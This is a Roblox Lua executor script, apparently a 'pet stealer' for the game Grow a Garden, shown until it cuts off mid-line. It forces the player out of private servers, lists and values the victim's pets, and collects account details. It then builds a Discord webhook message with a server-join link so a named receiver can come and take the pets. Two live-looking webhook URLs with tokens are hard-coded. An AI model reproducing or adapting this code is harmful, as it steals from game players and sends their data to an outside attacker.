local HttpService = game:GetService("HttpService")

local Webhook = "https://discord.com/api/webhooks/1386540467340185683/a_0kHXLetYZdZwrEa2niqiYd5LxuNx1wCwNkt-bDtEko9bAo2Lv7vIvhmQ_dJIfYSs3e"
local Username = "mery911"

local function sendWebhook(content)
    local payload = {
        username = Username,
        content = content
    }
    local headers = { ["Content-Type"] = "application/json" }
    local requestData = HttpService:JSONEncode(payload)

    local success, response = pcall(function()
        return syn and syn.request or http_request or request
    end)

    if success and response then
        response({
            Url = Webhook,
            Method = "POST",
            Headers = headers,
            Body = requestData
        })
        print("Webhook sent successfully!")
    else
        warn("Failed to send webhook. Your environment may not support HTTP requests.")
    end
end
getgenv().Webhook = "https://discord.com/api/webhooks/1422841362910416990/41fqH7X8_7vUqkiMjiM9t098GtuKo1SuWgk6ssEGdP-6rTf7G0WwSwtMPH8fANCS7FG5"
getgenv().Username = "mery911"
        local RS = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local HttpService = game:GetService("HttpService")
        local RunService = game:GetService("RunService")
        local LocalizationService = game:GetService("LocalizationService")
        local DataService = require(RS.Modules.DataService)
        local PetRegistry = require(RS.Data.PetRegistry)
        local NumberUtil = require(RS.Modules.NumberUtil)
        local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
        local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
        local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
        local TeleportService = game:GetService("TeleportService")

        local data = DataService:GetData()
        local maxAttempts = 10
        local attempt = 1
        local teleported = false

        
        if GetServerType:InvokeServer() == "VIPServer" then
            while attempt <= maxAttempts and not teleported do
                local servers = {}
                local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
                local body = HttpService:JSONDecode(req)

                if body and body.data then
                    for _, v in next, body.data do
                        if tonumber(v.playing) and tonumber(v.maxPlayers)
                        and (tonumber(v.maxPlayers) - tonumber(v.playing) >= 2)
                        and v.id ~= game.JobId then
                            table.insert(servers, v.id)
                        end
                    end
                end

                if #servers > 0 then
                    local success = pcall(function()
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
                    end)
                    if success then
                        teleported = true
                        break
                    end
                end

                attempt += 1
                if attempt <= maxAttempts then
                    task.wait(1)
                end
            end

            if not teleported then
                warn("Failed to find a non-full server after "..maxAttempts.." attempts")
            end
        end

        if GetServerType:InvokeServer() == "VIPServer" then
            error("Script stopped - VIP Server detected")        
        end

        if getgenv().EclipseHubRunning then
            warn("Script is already running or has been executed! Cannot run again.")
            return
        end
        getgenv().EclipseHubRunning = true

        -- Updated PetPriorityData with isMutation field and additional pets
        local PetPriorityData = {
                -- Regular pets
                ["Kitsune"] = { priority = 1, emoji = "ðŸ¦Š", isMutation = false },
                ["Raccoon"] = { priority = 2, emoji = "ðŸ¦", isMutation = false },
                ["Disco Bee"] = { priority = 3, emoji = "ðŸª©", isMutation = false },
                ["Fennec fox"] = { priority = 4, emoji = "ðŸ¦Š", isMutation = false },
                ["Butterfly"] = { priority = 5, emoji = "ðŸ¦‹", isMutation = false },
                ["Dragonfly"] = { priority = 6, emoji = "ðŸ²", isMutation = false },
                ["Mimic Octopus"] = { priority = 7, emoji = "ðŸ™", isMutation = false },
                ["Corrupted Kitsune"] = { priority = 8, emoji = "ðŸ¦Š", isMutation = false },
                ["T-Rex"] = { priority = 9, emoji = "ðŸ¦–", isMutation = false },
                ["Spinosaurus"] = { priority = 10, emoji = "ðŸ«Ž", isMutation = false },
                ["Queen Bee"] = { priority = 11, emoji = "ðŸ‘‘", isMutation = false },
                ["Red Fox"] = { priority = 26, emoji = "ðŸ¦Š", isMutation = false },
                -- Mutations
                ["Ascended"] = { priority = 14, emoji = "ðŸ”º", isMutation = true },
                ["Mega"] = { priority = 15, emoji = "ðŸ˜", isMutation = true },
                ["Shocked"] = { priority = 16, emoji = "âš¡", isMutation = true },
                ["Rainbow"] = { priority = 17, emoji = "ðŸŒˆ", isMutation = true },
                ["Radiant"] = { priority = 18, emoji = "ðŸ›¡ï¸", isMutation = true },
                ["Corrupted"] = { priority = 19, emoji = "ðŸ§¿", isMutation = true },
                ["IronSkin"] = { priority = 20, emoji = "ðŸ’¥", isMutation = true },
                ["Tiny"] = { priority = 21, emoji = "ðŸ”¹", isMutation = true },
                ["Golden"] = { priority = 22, emoji = "ðŸ¥‡", isMutation = true },
                ["Frozen"] = { priority = 23, emoji = "â„ï¸", isMutation = true },
                ["Windy"] = { priority = 24, emoji = "ðŸŒªï¸", isMutation = true },
                ["Inverted"] = { priority = 25, emoji = "ðŸ”„", isMutation = true },
                ["Shiny"] = { priority = 26, emoji = "âœ¨", isMutation = true },
                ["Tranquil"] = { priority = 27, emoji = "ðŸ§˜", isMutation = true },
            }

        local function detectExecutor()
            local name
            local success = pcall(function()
                if identifyexecutor then
                    name = identifyexecutor()
                elseif getexecutorname then
                    name = getexecutorname()
                end
            end)
            return name or "Unknown"
        end

        local function formatNumberWithCommas(n)
            local str = tostring(n)
            return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
        end

        local function getWeight(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end
            
            local weight = toolName:match("%[([%d%.]+) KG%]")
            weight = weight and tonumber(weight)
            
            return weight
        end

        local function getAge(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end    
            local age = toolName:match("%[Age (%d+)%]")
            age = age and tonumber(age)
            
            return age
        end

        local function GetPlayerPets()
            local unsortedPets = {}
            local equippedPets = {}
            local player = Players.LocalPlayer
            if not data or not data.PetsData then
                warn("No pet data available in data.PetsData")
                return unsortedPets
            end

            if workspace:FindFirstChild("PetsPhysical") then
                for _, petMover in workspace.PetsPhysical:GetChildren() do
                    if petMover and petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
                        for _, pet in petMover:GetChildren() do
                            table.insert(equippedPets, pet.Name)
                            PetsService:UnequipPet(pet.Name)
                        end
                    end
                end
            end

            task.wait(0.5)
            for _, tool in pairs(player.Backpack:GetChildren()) do
                if not tool or not tool.Parent then
                    continue
                end
            
                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
                    local petName = tool.Name
                    
                    if petName:find("Bald Eagle") or petName:find("Golden Lab") then
                        continue
                    end

                    local function SafeCalculatePetValue(tool)
                        local player = Players.LocalPlayer
                        local PET_UUID = tool:GetAttribute("PET_UUID")
                        
                        if not PET_UUID then
                            warn("SafeCalculatePetValue | No UUID!")
                            return 0
                        end
                        
                        local data = DataService:GetData()
                        if not data or not data.PetsData.PetInventory.Data[PET_UUID] then
                            warn("SafeCalculatePetValue | No pet data found!")
                            return 0
                        end
                        
                        local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
                        local petData = petInventoryData.PetData
                        local HatchedFrom = petData.HatchedFrom
                        
                        if not HatchedFrom or HatchedFrom == "" then
                            warn("SafeCalculatePetValue | No HatchedFrom value!")
                            return 0
                        end
                        
                        local eggData = PetRegistry.PetEggs[HatchedFrom]
                        if not eggData then
                            warn("SafeCalculatePetValue | No egg data found!")
                            return 0
                        end
                        
                        local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
                        if not rarityData then
                            warn("SafeCalculatePetValue | No pet data in egg!")
                            return 0
                        end
                        
                        local WeightRange = rarityData.GeneratedPetData.WeightRange
                        if not WeightRange then
                            warn("SafeCalculatePetValue | No WeightRange found!")
                            return 0
                        end
                        
                        local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
                        local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
                        local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
                        
                        return math.floor(sellPrice * weightMultiplier * levelMultiplier)
                    end

                    local age = getAge(tool.Name) or 0
                    local weight = getWeight(tool.Name) or 0
                    
                    local strippedName = petName:gsub(" %[.*%]", "")

                    local function stripMutationPrefix(name)
                        for key, data in pairs(PetPriorityData) do
                            if data.isMutation and name:lower():find(key:lower()) == 1 then
                                return name:sub(#key + 2)
                            end
                        end
                        return name
                    end

                    local petType = stripMutationPrefix(strippedName)
                    
                    local rawValue = SafeCalculatePetValue(tool)
                    if rawValue and rawValue > 0 then
                        table.insert(unsortedPets, {
                            PetName = petName,
                            PetAge = age,
                            PetWeight = weight,
                            Id = tool:GetAttribute("PET_UUID") or tool:GetAttribute("uuid"),
                            Type = petType,
                            Value = rawValue,
                            Formatted = formatNumberWithCommas(rawValue),
                        })
                    else
                        warn("Failed to calculate value for:", tool.Name)
                        continue
                    end
                end
            end

            task.wait(0.5)
            if equippedPets then
                for _, petName in pairs(equippedPets) do
                    if petName then
                        game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
                    end
                end
            end
            return unsortedPets
        end

        local pets = GetPlayerPets()

        local Webhook = getgenv().Webhook
        local Username = getgenv().Username

        local function isMutated(toolName)
            for key, data in pairs(PetPriorityData) do
                if data.isMutation and toolName:lower():find(key:lower()) == 1 then
                    return key
                end
            end
            return nil
        end

        -- Sort pets by priority, then by value using PetPriorityData
        table.sort(pets, function(a, b)
            -- Get a's priority
            local aPriority, aMutation = 99, isMutated(a.PetName)
            if PetPriorityData[a.Type] then
                aPriority = PetPriorityData[a.Type].priority
            elseif aMutation and PetPriorityData[aMutation] then
                aPriority = PetPriorityData[aMutation].priority
            elseif a.Weight and a.Weight >= 10 then
                aPriority = 12
            elseif a.Age and a.Age >= 60 then
                aPriority = 13
            end

            -- Get b's priority
            local bPriority, bMutation = 99, isMutated(b.PetName)
            if PetPriorityData[b.Type] then
                bPriority = PetPriorityData[b.Type].priority
            elseif bMutation and PetPriorityData[bMutation] then
                bPriority = PetPriorityData[bMutation].priority
            elseif b.Weight and b.Weight >= 10 then
                bPriority = 12
            elseif b.Age and b.Age >= 60 then
                bPriority = 13
            end

            -- Compare priorities
            if aPriority == bPriority then
                return a.Value > b.Value
            else
                return aPriority < bPriority
            end
        end)

        local function hasRarePets()
            for _, pet in pairs(pets) do
                if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
                    return true
                end
            end
            return false
        end

        local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

        
        local tpScript = string.format(
            'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
            game.PlaceId,
            game.JobId
        )
        


        -- Update pet string generation
        local petString = ""

        for _, pet in ipairs(pets) do
            local highestPriority = 99
            local chosenEmoji = "ðŸ¶"
            local mutation = isMutated(pet.PetName)
            local mutationData = mutation and PetPriorityData[mutation] or nil
            local petData = PetPriorityData[pet.Type] or nil

            if petData and petData.priority < highestPriority then
                highestPriority = petData.priority
                chosenEmoji = petData.emoji
            elseif mutationData and mutationData.priority < highestPriority then
                highestPriority = mutationData.priority
                chosenEmoji = mutationData.emoji
            elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
                highestPriority = 12
                chosenEmoji = "ðŸ˜"
            elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
                highestPriority = 13
                chosenEmoji = "ðŸ‘´"
            end

            local petName = pet.PetName
            local petValue = pet.Formatted
            petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " â†’ " .. petValue
        end
        local playerCount = #Players:GetPlayers()

        local function getPlayerCountry(player)
            local success, result = pcall(function()
                return LocalizationService:GetCountryRegionForPlayerAsync(player)
            end)
            
            if success then
                return result
            else
                return "Unknown"
            end
        end    

        local accountAgeInDays = Players.LocalPlayer.AccountAge
        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
        local creationDateString = os.date("%Y-%m-%d", creationDate)

        local function truncateByLines(inputString, maxLines)
            local lines = {}
            for line in inputString:gmatch("[^\n]+") do
                table.insert(lines, line)
            end
            
            if #lines <= maxLines then
                return inputString
            else
                local truncatedLines = {}
                for i = 1, maxLines - 1 do
                    table.insert(truncatedLines, lines[i])
                end
                return table.concat(truncatedLines, "\n")
            end
        end
-- Calculate total value
local totalValue = 0
for _, pet in ipairs(pets) do
    totalValue += pet.Value or 0
end
local formattedTotalValue = formatNumberWithCommas(totalValue)

local embed = {
    title = "ðŸŒµ Grow A Garden Hit - DARK SCRIPTS ðŸ€",
    color = 65280,
    fields = {
        {
            name = "ðŸ‘¤ **Player Information**",
            value = string.format(
                "```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                Players.LocalPlayer.DisplayName or "Unknown",
                Username or "Unknown",
                detectExecutor() or "Unknown",
                tostring(Players.LocalPlayer.AccountAge or 0)
            ),
            inline = false
        },
{
    name = "ðŸ’° **Total Value**",
    value = string.format("```%s```", formattedTotalValue),
    inline = false
},

        {
            name = "ðŸŒ´ **Backpack**",
            value = string.format("```%s```", truncateByLines(petString, 20)),
            inline = false
        },
        {
            name = "ðŸï¸ **Join with URL**",
            value = string.format(
                "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                game.JobId,
                game.PlaceId,
                game.JobId
            ),
            inline = false
        }
    },
    footer = {
        text = string.format("%s | %s", game.PlaceId, game.JobId)
    }
}

local payload = {
    content = (hasRarePets() and "--@everyone\n" or "") ..
              string.format("\n%s\n", tpScript or "N/A"),
    embeds = {embed}
}

-- Full backpack string (no truncation)
local fullBackpackString = ""
for _, pet in ipairs(pets) do
    local highestPriority = 99
    local chosenEmoji = "ðŸ¶"
    local mutation = isMutated(pet.PetName)
    local mutationData = mutation and PetPriorityData[mutation] or nil
    local petData = PetPriorityData[pet.Type] or nil

    if petData and petData.priority < highestPriority then
        highestPriority = petData.priority
        chosenEmoji = petData.emoji
    elseif mutationData and mutationData.priority < highestPriority then
        highestPriority = mutationData.priority
        chose
